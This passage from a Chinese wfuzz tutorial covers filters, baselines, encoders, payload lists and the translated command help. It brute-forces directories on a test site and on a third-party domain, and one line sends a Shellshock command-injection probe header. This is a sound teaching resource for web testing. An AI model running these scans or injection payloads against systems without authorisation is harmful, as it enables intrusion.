<li>最后，短的方式是使用别名：<br>  <code>$ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</code></li>
</ul>
<p><code>stdin</code>这个payload可以在使用一些外部字典生成工具时很方便：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/src/wfuzz]</span><br><span class="line">└──╼ $crunch 2 2 ab | wfuzz -z stdin http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Crunch will now generate the following amount of data: 12 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 4 </span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: &lt;&lt;unknown&gt;&gt;</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000002:  C=404      7 L	      12 W	    168 Ch	  &quot;ab&quot;</span><br><span class="line">000001:  C=404      7 L	      12 W	    168 Ch	  &quot;aa&quot;</span><br><span class="line">000003:  C=404      7 L	      12 W	    168 Ch	  &quot;ba&quot;</span><br><span class="line">000004:  C=404      7 L	      12 W	    168 Ch	  &quot;bb&quot;</span><br><span class="line"></span><br><span class="line">Total time: 3.827355</span><br><span class="line">Processed Requests: 4</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 1.045107</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="使用多个payloads"><a href="#使用多个payloads" class="headerlink" title="使用多个payloads"></a>使用多个payloads</h4><p>使用<code>-z</code> 或<code>-w</code> 参数可以同时指定多个payloads，这时相应的占位符应设置为 FUZZ, … , FUZnZ, 其中<code>n</code>代表了payload的序号。比如下面的例子，我们同时暴破文件，后缀和目录：<br><code>$ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt --hc 404 http://testphp.vulnweb.com/FUZZ/FUZ2ZFUZ3Z</code></p>
<hr>
<h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>对wfuzz的结果时行过滤是非常重要的：</p>
<ul>
<li>非常大的字典文件可以生成非常庞大的输出，并且把我们想要的结果淹没</li>
<li>对HTTP响应的一些分类在实际攻击时是非常重要的，例如，为了查检一个SQLi的漏洞是否存在，我们必须能够将合理的响应和错误&#x2F;不同的响应区分开。</li>
</ul>
<p>wfuzz可根据HTTP响应码和收到的响应的长度（字数，字符数或行数）来过滤。还可以用正则表达式。<br>过滤的方法有两种：隐藏或显示符合过滤条件的结果。</p>
<hr>
<h5 id="隐藏响应结果"><a href="#隐藏响应结果" class="headerlink" title="隐藏响应结果"></a>隐藏响应结果</h5><p>通过<code>--hc</code>，<code>--hl</code>，<code>--hw</code>，<code>--hh</code>参数可以隐藏某些HTTP响应。<br>隐藏无法找到的页面的响应如下：<br><code>$ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://testphp.vulnweb.com/FUZZ</code></p>
<p>可指定多个需要隐藏的条件，如，想要加上隐藏禁止访问的响应：<br><code>$ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,403 http://testphp.vulnweb.com/FUZZ</code></p>
<p>用行数，字数，字符数来指定过滤规则，在当HTTP返回码相同的时候比较方便。比如，网站一般会指定一个自定义的错误页面，返回码是200，但实际上起到了一个404页面的作用，我们称之为软404。<br>下面是一个例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://datalayer.io/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://datalayer.io/FUZZ</span><br><span class="line">Total requests: 950</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000083:  C=200     51 L	     138 W	    962 Ch	  &quot;apache&quot;</span><br><span class="line">000008:  C=200     51 L	     138 W	    962 Ch	  &quot;100&quot;</span><br><span class="line">000009:  C=200     51 L	     138 W	    962 Ch	  &quot;1000&quot;</span><br><span class="line">000011:  C=200     51 L	     138 W	    962 Ch	  &quot;2&quot;</span><br><span class="line">000012:  C=200     51 L	     138 W	    962 Ch	  &quot;20&quot;</span><br><span class="line">000013:  C=200     51 L	     138 W	    962 Ch	  &quot;200&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>仔细观察上面的结果，我们很容易推断出所有”not found”的返回信息中都有 51个行，138个字，962个字符。因此，我们需要改进一下我们的过滤条件（增加多个过滤条件）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hh 962 http://datalayer.io/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://datalayer.io/FUZZ</span><br><span class="line">Total requests: 950</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000430:  C=302      0 L	       0 W	      0 Ch	  &quot;img&quot;</span><br><span class="line">000689:  C=500      2 L	       1 W	      9 Ch	  &quot;register&quot;</span><br><span class="line">000135:  C=302      0 L	       0 W	      0 Ch	  &quot;blog&quot;</span><br><span class="line">000438:  C=200   1677 L	    5416 W	  90077 Ch	  &quot;index&quot;</span><br><span class="line"></span><br><span class="line">Total time: 8.323663</span><br><span class="line">Processed Requests: 950</span><br><span class="line">Filtered Requests: 946</span><br><span class="line">Requests/sec.: 114.1324</span><br></pre></td></tr></table></figure>

<hr>
<h5 id="显示响应结果"><a href="#显示响应结果" class="headerlink" title="显示响应结果"></a>显示响应结果</h5><p>显示响应结果的使用方法跟隐藏时的原理一样，只不过参数变为了：<code>--sc</code>，<code>--sl</code>，<code>--sw</code>，<code>--sh</code>。</p>
<hr>
<h5 id="使用Baseline"><a href="#使用Baseline" class="headerlink" title="使用Baseline"></a>使用Baseline</h5><p>习惯上称Baseline为”基准线“。过滤器可以是某个HTTP响应的引用，这样的引用我们称为Baseline。<br>之前的使用<code>--hh</code>进行过滤的例子中，还可以使用下面的命令代替：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh BBB http://datalayer.io/FUZZ&#123;notthere&#125;</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://datalayer.io/FUZZ</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000002:  C=200     51 L	     138 W	    962 Ch	  &quot;notthere&quot;</span><br><span class="line">000432:  C=302      0 L	       0 W	      0 Ch	  &quot;img&quot;</span><br><span class="line">000086:  C=404      0 L	       0 W	      0 Ch	  &quot;api&quot;</span><br><span class="line">000691:  C=500      2 L	       1 W	      9 Ch	  &quot;register&quot;</span><br><span class="line">000137:  C=302      0 L	       0 W	      0 Ch	  &quot;blog&quot;</span><br><span class="line">000045:  C=404      0 L	       0 W	      0 Ch	  &quot;WEB-INF&quot;</span><br><span class="line">000440:  C=200   1677 L	    5416 W	  90077 Ch	  &quot;index&quot;</span><br><span class="line"></span><br><span class="line">Total time: 21.76636</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 944</span><br><span class="line">Requests/sec.: 43.69125</span><br></pre></td></tr></table></figure>
<p>这里，<code>&#123; &#125;</code>来指定<code>第一次</code>HTTP请求时用来替换<code>FUZZ占位符</code>的值，其响应将被标记为<code>BBB</code>，并用于过滤条件中。</p>
<hr>
<h5 id="使用正则表达式过滤"><a href="#使用正则表达式过滤" class="headerlink" title="使用正则表达式过滤"></a>使用正则表达式过滤</h5><p>在命令行中，参数<code>--ss</code>和<code>--hs</code>可以接受正则表达式来对返回的结果时行过滤。<br>详细例子请参考<a href="http://edge-security.blogspot.co.uk/2014/10/scan-for-shellshock-with-wfuzz.html">http://edge-security.blogspot.co.uk/2014/10/scan-for-shellshock-with-wfuzz.html</a><br><code>$ wfuzz -H &quot;User-Agent: () &#123; :;&#125;; echo; echo vulnerable&quot; --ss vulnerable -w cgis.txt http://localhost:8000/FUZZ</code></p>
<hr>
<h3 id="重要关键词"><a href="#重要关键词" class="headerlink" title="重要关键词"></a>重要关键词</h3><hr>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>payload为wfuzz生成的用于测试的特定字符串，一般情况下，会替代被测试URL中的FUZZ占位符。<br>当前版本中的wfuzz中可用payloads列表如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -e payloads</span><br><span class="line"></span><br><span class="line">Available payloads:</span><br><span class="line"></span><br><span class="line">  Name            | Summary                                                                           </span><br><span class="line">------------------------------------------------------------------------------------------------------</span><br><span class="line">  guitab          | 从可视化的标签栏中读取请求                                </span><br><span class="line">  dirwalk         | 递归获得本地某个文件夹中的文件名                            </span><br><span class="line">  file            | 获取一个文件当中的每个词                                                    </span><br><span class="line">  autorize        | 获取autorize的测试结果Returns fuzz results&#x27; from autororize.                                            </span><br><span class="line">  wfuzzp          | 从之前保存的wfuzz会话中获取测试结果的URL                   </span><br><span class="line">  ipnet           | 获得一个指定网络的IP地址列表                                        </span><br><span class="line">  bing            | 获得一个使用bing API搜索的URL列表 (需要 api key).                   </span><br><span class="line">  stdin           | 获得从标准输入中的条目                                                </span><br><span class="line">  list            | 获得一个列表中的每一个元素，列表用以 - 符号分格                       </span><br><span class="line">  hexrand         | 从一个指定的范围中随机获取一个hex值                                  </span><br><span class="line">  range           | 获得指定范围内的每一个数值                                          </span><br><span class="line">  names           | 从一个以 - 分隔的列表中，获取以组合方式生成的所有usernames值</span><br><span class="line">  burplog         | 从BurpSuite的记录中获得测试结果                                             </span><br><span class="line">  permutation     | 获得一个在指定charset和length时的字符组合                             </span><br><span class="line">  buffer_overflow | 获得一个包含指定个数个A的字符串.                    </span><br><span class="line">  hexrange        | 获得指定范围内的每一个hex值                                   </span><br><span class="line">  iprange         | 获得指定IP范围内的IP地址列表                                 </span><br><span class="line">  burpstate       | 从BurpSuite的状态下获得测试结果                                           </span><br></pre></td></tr></table></figure>

<hr>
<h4 id="encoder"><a href="#encoder" class="headerlink" title="encoder"></a>encoder</h4><p>encoder的作用是将payload进行编码或加密。<br>wfuzz的encoder列表如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -e encoders</span><br><span class="line"></span><br><span class="line">Available encoders:</span><br><span class="line"></span><br><span class="line">  Category      | Name              		| Summary                                                                           </span><br><span class="line">------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">  url_safe, url | urlencode 			    | 用`%xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">  url_safe, url | double urlencode 		    | 用`%25xx`的方式替换特殊字符， 字母/数字/下划线/半角点/减号不替换</span><br><span class="line">  url  		    | uri_double_hex			| 用`%25xx`的方式将所有字符进行编码</span><br><span class="line">  html  		| html_escape			    | 将`&amp;`，`&lt;`，`&gt;`转换为HTML安全的字符</span><br><span class="line">  html		    | html_hexadecimal 		    | 用 `&amp;#xx;` 的方式替换所有字符</span><br><span class="line">  hashes 		| base64			        | 将给定的字符串中的所有字符进行base64编码</span><br><span class="line">  url 		    | doble_nibble_hex 		    | 将所有字符以`%%dd%dd`格式进行编码</span><br><span class="line">  db 		    | mssql_char			    | 将所有字符转换为MsSQL语法的`char(xx)`形式</span><br><span class="line">  url 		    | utf8				        | 将所有字符以`\u00xx` 格式进行编码</span><br><span class="line">  hashes 		| md5 			            | 将给定的字符串进行md5加密</span><br><span class="line">  default 		| random_upper		        | 将字符串中随机字符变为大写</span><br><span class="line">  url 		    | first_nibble_hex  		| 将所有字符以`%%dd?` 格式进行编码</span><br><span class="line">  default 		| hexlify			        | 每个数据的单个比特转换为两个比特表示的hex表示</span><br><span class="line">  url 		    | second_nibble_hex 		| 将所有字符以`%?%dd` 格式进行编码</span><br><span class="line">  url 		    | uri_hex 			        | 将所有字符以`%xx` 格式进行编码</span><br><span class="line">  default 		| none 			            | 不进行任何编码</span><br><span class="line">  hashes 		| sha1			            | 将字符串进行sha1加密</span><br><span class="line">  url 		    | utf8_binary			    | 将字符串中的所有字符以 `\uxx` 形式进行编码</span><br><span class="line">  url 		    | uri_triple_hex 			| 将所有字符以`%25%xx%xx` 格式进行编码</span><br><span class="line">  url 		    | uri_unicode			    | 将所有字符以`%u00xx` 格式进行编码</span><br><span class="line">  html 		    | html_decimal			    | 将所有字符以 `&amp;#dd; ` 格式进行编码</span><br><span class="line">  db 		    | oracle_char			    | 将所有字符转换为Oracle语法的`chr(xx)`形式</span><br><span class="line">  db 		    | mysql_char 			    | 将所有字符转换为MySQL语法的`char(xx)`形式</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h4><p>wfuzz的iterator提供了针对多个payload的处理方式。<br>itorators的列表如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -e iterators</span><br><span class="line"></span><br><span class="line">Available iterators:</span><br><span class="line"></span><br><span class="line">  Name    | Summary                                                                           </span><br><span class="line">----------------------------------------------------------------------------------------------</span><br><span class="line">  product | 返回输入条目的笛卡尔积</span><br><span class="line">  zip     | Retns an iterator that aggregates elements from each of the iterables.（翻译不好，请自行理解）</span><br><span class="line">  chain   | Returns an iterator returns elements from the first iterable until it is exhaust  </span><br><span class="line">         	 | ed, then proceeds to the next iterable, until all of the iterables are exhausted  </span><br><span class="line">         	 | （翻译不好，请自行理解）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="printer"><a href="#printer" class="headerlink" title="printer"></a>printer</h4><p>wfuzz的printers用于控制输出打印。<br>printers列表如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -e printers</span><br><span class="line"></span><br><span class="line">Available printers:</span><br><span class="line"></span><br><span class="line">  Name      | Summary                             </span><br><span class="line">--------------------------------------------------</span><br><span class="line">  raw       | `Raw` output format</span><br><span class="line">  json      | Results in `json` format</span><br><span class="line">  csv       | `CSV` printer ftw</span><br><span class="line">  magictree | Prints results in `magictree` format</span><br><span class="line">  html      | Prints results in `html` format</span><br><span class="line">（比较好懂，不再翻译）</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="scripts"><a href="#scripts" class="headerlink" title="scripts"></a>scripts</h4><p>暂时不知道怎么使用<br>scripts列表如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz -e scripts</span><br><span class="line"></span><br><span class="line">Available scripts:</span><br><span class="line"></span><br><span class="line">  Category                   | Name          | Summary</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">  default, passive           | cookies       | 查找新的cookies</span><br><span class="line">  default, passive           | errors        | 查找错误信息</span><br><span class="line">  passive                    | grep          | HTTP response grep</span><br><span class="line">  active                     | screenshot    | 用linux cutycapt tool 进行屏幕抓取 </span><br><span class="line">  default, active, discovery | links         | 解析HTML并查找新的内容</span><br><span class="line">  default, active, discovery | wc_extractor  | 解析subversion的wc.db文件</span><br><span class="line">  default, passive           | listing       | 查找列目录漏洞</span><br><span class="line">  default, passive           | title         | 解析HTML页面的title</span><br><span class="line">  default, active, discovery | robots        | 解析robots.txt文件来查找新内容</span><br><span class="line">  default, passive           | headers       | 查找服务器的返回头</span><br><span class="line">  default, active, discovery | cvs_extractor | 解析 CVS/Entries 文件</span><br><span class="line">  default, active, discovery | svn_extractor | 解析 .svn/entries 文件</span><br><span class="line">  active, discovery          | backups       | 查找已知的备份文件名</span><br><span class="line">  default, active, discovery | sitemap       | 解析 sitemap.xml 文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="内置工具"><a href="#内置工具" class="headerlink" title="内置工具"></a>内置工具</h3><hr>
<h4 id="wfencode-工具"><a href="#wfencode-工具" class="headerlink" title="wfencode 工具"></a>wfencode 工具</h4><p>这是wfuzz自带的一个加密&#x2F;解密（编码&#x2F;反编码）工具，目前支持内建的encoders的加&#x2F;解密。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfencode -e base64 123456</span><br><span class="line">MTIzNDU2</span><br><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfencode -d base64 MTIzNDU2</span><br><span class="line">123456</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="wfpayload工具"><a href="#wfpayload工具" class="headerlink" title="wfpayload工具"></a>wfpayload工具</h4><p>wfpayload是payload生成工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfpayload -z range,0-10</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="wxfuzz-工具"><a href="#wxfuzz-工具" class="headerlink" title="wxfuzz 工具"></a>wxfuzz 工具</h4><p>这个看源码是一个wxPython化的wfuzz，也就是GUI图形界面的wfuzz。目前需要wxPython最新版本才能使用，但是在ParrotOS和Kali上都无法正常安装成功，问题已在GitHub提交Issue，期待开发者的回复中…</p>
<hr>
<h3 id="wfuzz命令中文帮助"><a href="#wfuzz命令中文帮助" class="headerlink" title="wfuzz命令中文帮助"></a>wfuzz命令中文帮助</h3><p>这是wfuzz的主工具，我们平时使用的时候就是用这个。<br>先来看看帮助文档：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[✗]─[michael@parrot]─[~]</span><br><span class="line">└──╼ $wfuzz --help</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">*                                                      *</span><br><span class="line">* Version up to 1.4c coded by:                         *</span><br><span class="line">* Christian Martorella (cmartorella@edge-security.com) *</span><br><span class="line">* Carlos del ojo (deepbit@gmail.com)                   *</span><br><span class="line">*                                                      *</span><br><span class="line">* Version 1.4d to 2.2.9 coded by:                      *</span><br><span class="line">* Xavier Mendez (xmendez@edge-security.com)            *</span><br><span class="line">********************************************************</span><br><span class="line">	</span><br><span class="line">	Usage:	wfuzz [options] -z payload,params &lt;url&gt;</span><br><span class="line">	</span><br><span class="line">		FUZZ, ..., FUZnZ  			payload占位符，wfuzz会用指定的payload代替相应的占位符，n代表数字. </span><br><span class="line">		FUZZ&#123;baseline_value&#125; 	FUZZ 会被 baseline_value替换，并将此作为测试过程中第一个请求来测试，可用来作为过滤的一个基础。</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	Options:</span><br><span class="line">		-h/--help		    : 帮助文档</span><br><span class="line">		--help			    : 高级帮助文档</span><br><span class="line">		--version		    : Wfuzz详细版本信息</span><br><span class="line">		-e &lt;type&gt;		    :  显示可用的encoders/payloads/iterators/printers/scripts列表</span><br><span class="line">	</span><br><span class="line">		--recipe &lt;filename&gt;	    : 从文件中读取参数</span><br><span class="line">		--dump-recipe &lt;filename&gt;    : 打印当前的参数并保存成文档</span><br><span class="line">		--oF &lt;filename&gt;   		    : 将测试结果保存到文件，这些结果可被wfuzz payload 处理</span><br><span class="line">		</span><br><span class="line">		-c			    : 彩色化输出</span><br><span class="line">		-v			    : 详细输出</span><br><span class="line">		-f filename,printer         : 将结果以printer的方式保存到filename (默认为raw printer).</span><br><span class="line">		-o printer                  : 输出特定printer的输出结果</span><br><span class="line">		--interact		    : (测试功能) 如果启用，所有的按键将会被捕获，这使得你能够与程序交互</span><br><span class="line">		--dry-run		    : 打印测试结果，而并不发送HTTP请求</span><br><span class="line">		--prev    		    : 打印之前的HTTP请求（仅当使用payloads来生成测试结果时使用）</span><br><span class="line">		</span><br><span class="line">		-p addr			    : 使用代理，格式 ip:port:type. 可设置多个代理，type可取的值为SOCKS4,SOCKS5 or HTTP（默认）</span><br><span class="line">		</span><br><span class="line">		-t N			    : 指定连接的并发数，默认为10</span><br><span class="line">		-s N			    : 指定请求的间隔时间，默认为0</span><br><span class="line">		-R depth		    : 递归路径探测，depth指定最大递归数量</span><br><span class="line">		-L,--follow		    : 跟随HTTP重定向</span><br><span class="line">		-Z			    : 扫描模式 (连接错误将被忽视).</span><br><span class="line">		--req-delay N		    : 设置发送请求允许的最大时间，默认为 90，单位为秒.</span><br><span class="line">		--conn-delay N              : 设置连接等待的最大时间，默认为 90，单位为秒.</span><br><span class="line">		</span><br><span class="line">		-A			    : 是 --script=default -v -c 的简写</span><br><span class="line">		--script=		    : 与 --script=default 等价</span><br><span class="line">		--script=&lt;plugins&gt;	    : 进行脚本扫描， &lt;plugins&gt; 是一个以逗号分开的插件或插件分类列表</span><br><span class="line">		--script-help=&lt;plugins&gt;	    : 显示脚本的帮助</span><br><span class="line">		--script-args n1=v1,...     : 给脚本传递参数. ie. --script-args grep.regex=&quot;&lt;A href=\&quot;(.*?)\&quot;&gt;&quot;</span><br><span class="line">		</span><br><span class="line">		-u url                      : 指定请求的URL</span><br><span class="line">		-m iterator		    : 指定一个处理payloads的迭代器 (默认为product)</span><br><span class="line">		-z payload		    : 为每一个占位符指定一个payload，格式为 name[,parameter][,encoder].</span><br><span class="line">					      编码可以是一个列表, 如 md5-sha1. 还可以串联起来, 如. md5@sha1.</span><br><span class="line">					      还可使用编码各类名，如 url</span><br><span class="line">			                              使用help作为payload来显示payload的详细帮助信息，还可使用--slice进行过滤</span><br><span class="line">		--zP &lt;params&gt;		    : 给指定的payload设置参数。必须跟在 -z 或-w 参数后面</span><br><span class="line">		--slice &lt;filter&gt;	    : 以指定的表达式过滤payload的信息，必须跟在-z 参数后面</span><br><span class="line">		-w wordlist		    : 指定一个wordlist文件，等同于 -z file,wordlist</span><br><span class="line">		-V alltype		    : 暴力测试所有GET/POST参数，无需指定占位符</span><br><span class="line">		-X method		    : 指定一个发送请求的HTTP方法，如HEAD或FUZZ</span><br><span class="line">		</span><br><span class="line">		-b cookie		    : 指定请求的cookie参数，可指定多个cookie</span><br><span class="line">		-d postdata 		    : 设置用于测试的POST data (ex: &quot;id=FUZZ&amp;catalogue=1&quot;)</span><br><span class="line">		-H header  		    : 设置用于测试请求的HEADER (ex:&quot;Cookie:id=1312321&amp;user=FUZZ&quot;). 可指定多个HEADER.</span><br><span class="line">		--basic/ntlm/digest auth    : 格式为 &quot;user:pass&quot; or &quot;FUZZ:FUZZ&quot; or &quot;domain\FUZ2Z:FUZZ&quot;</span><br><span class="line">		</span><br><span class="line">		--hc/hl/hw/hh N[,N]+	    : 以指定的返回码/行数/字数/字符数作为判断条件隐藏返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">		--sc/sl/sw/sh N[,N]+	    : 以指定的返回码/行数/字数/字符数作为判断条件显示返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">		--ss/hs regex		    : 显示或隐藏返回结果中符合指定正则表达式的返回结果</span><br><span class="line">		--filter &lt;filter&gt;	    : 显示或隐藏符合指定filter表达式的返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">		--prefilter &lt;filter&gt;	    : 用指定的filter表达式在测试之前过滤某些测试条目</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>史上最详[ZI]细[DUO]的wfuzz中文教程（四）—— wfuzz 库</title>
    <url>/web-sec/%E5%8F%B2%E4%B8%8A%E6%9C%80%E8%AF%A6%5BZI%5D%E7%BB%86%5BDUO%5D%E7%9A%84wfuzz%E4%B8%AD%E6%96%87%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%20wfuzz%20%E5%BA%93.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>本文已在丁牛网安实验室FreeBuf专栏 <a href="http://www.freebuf.com/column/163632.html" title="DigApis安全">DigApis安全</a> 中首发！引用转发请注明 “原文来自：DigApis安全 m0nst3r”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<h2 id="wfuzz-库"><a href="#wfuzz-库" class="headerlink" title="wfuzz 库"></a>wfuzz 库</h2><hr>
<h3 id="wfuzz库参数"><a href="#wfuzz库参数" class="headerlink" title="wfuzz库参数"></a>wfuzz库参数</h3><p>在wfuzz库中包含所有 wfuzz命令行的参数。</p>
<table>
<thead>
<tr>
<th>CLI Option</th>
<th>Library Option</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;#60;URL&amp;#62;</td>
<td>url&#x3D;”url”</td>
</tr>
<tr>
<td>–recipe &amp;#60;filename&amp;#62;</td>
<td>recipe&#x3D;”filename”</td>
</tr>
<tr>
<td>-oF &amp;#60;filename&amp;#62;</td>
<td>save&#x3D;”filename”</td>
</tr>
<tr>
<td>-f filename,printer</td>
<td>printer&#x3D;(“filename”,”printer”)</td>
</tr>
<tr>
<td>–dry-run</td>
<td>dryrun&#x3D;True</td>
</tr>
<tr>
<td>-p addr</td>
<td>proxies&#x3D;[(“ip”,”port”,”type”)]</td>
</tr>
<tr>
<td>-t N</td>
<td>concurrent&#x3D;N</td>
</tr>
<tr>
<td>-s N</td>
<td>delay&#x3D;0.0</td>
</tr>
<tr>
<td>-R depth</td>
<td>rlevel&#x3D;depth</td>
</tr>
<tr>
<td>–follow</td>
<td>follow&#x3D;True</td>
</tr>
<tr>
<td>-Z</td>
<td>scanmod&#x3D;True</td>
</tr>
<tr>
<td>–req-delay N</td>
<td>req_delay&#x3D;N</td>
</tr>
<tr>
<td>–conn-delay N</td>
<td>conn_delay&#x3D;N</td>
</tr>
<tr>
<td>–script&#x3D;&amp;#60;plugins&amp;#62;</td>
<td>script&#x3D;”plugins”</td>
</tr>
<tr>
<td>–script-args n1&#x3D;v1,…</td>
<td>script_args&#x3D;{n1:v1,}</td>
</tr>
<tr>
<td>-m iterator</td>
<td>iterator&#x3D;”iterator”</td>
</tr>
<tr>
<td>-z payload</td>
<td>payloads&#x3D;[(“name”,{default&#x3D;””,encoder&#x3D;[“md5”]},slice&#x3D;””),]</td>
</tr>
<tr>
<td>-V alltype</td>
<td>allvars&#x3D;”alltype”</td>
</tr>
<tr>
<td>-X method</td>
<td>method&#x3D;”method”</td>
</tr>
<tr>
<td>–hc&#x2F;hl&#x2F;hw&#x2F;hh N[,N]+</td>
<td>hc&#x2F;hl&#x2F;hw&#x2F;hh&#x3D;[N,N]</td>
</tr>
<tr>
<td>–sc&#x2F;sl&#x2F;sw&#x2F;sh N[,N]+</td>
<td>sc&#x2F;sl&#x2F;sw&#x2F;sh&#x3D;[N,N]</td>
</tr>
<tr>
<td>–ss&#x2F;hs regex</td>
<td>ss&#x2F;hs&#x3D;”regex”</td>
</tr>
<tr>
<td>–filter &amp;#60;filter&amp;#62;</td>
<td>filter&#x3D;”filter exp”</td>
</tr>
<tr>
<td>–prefilter &amp;#60;filter&amp;#62;</td>
<td>prefilter&#x3D;”filter exp”</td>
</tr>
<tr>
<td>-b cookie</td>
<td>cookie&#x3D;[“cookie1&#x3D;value1”,]</td>
</tr>
<tr>
<td>-d postdata</td>
<td>postdata&#x3D;”postdata”</td>
</tr>
<tr>
<td>-H header</td>
<td>headers&#x3D;[(“header1”,”value1”),]</td>
</tr>
<tr>
<td>–basic&#x2F;ntlm&#x2F;digest auth</td>
<td>auth&#x3D;(“basic”,”user:pass”)</td>
</tr>
</tbody></table>
<p>这些参数可以在这些主库的接口中直接使用：<code>fuzz</code>, <code>payload</code>, <code>session</code>。</p>
<hr>
<h3 id="测试一个URL"><a href="#测试一个URL" class="headerlink" title="测试一个URL"></a>测试一个URL</h3><p>使用wfuzz库来测试一个URL是很简单的，首先，导入库文件：</p>
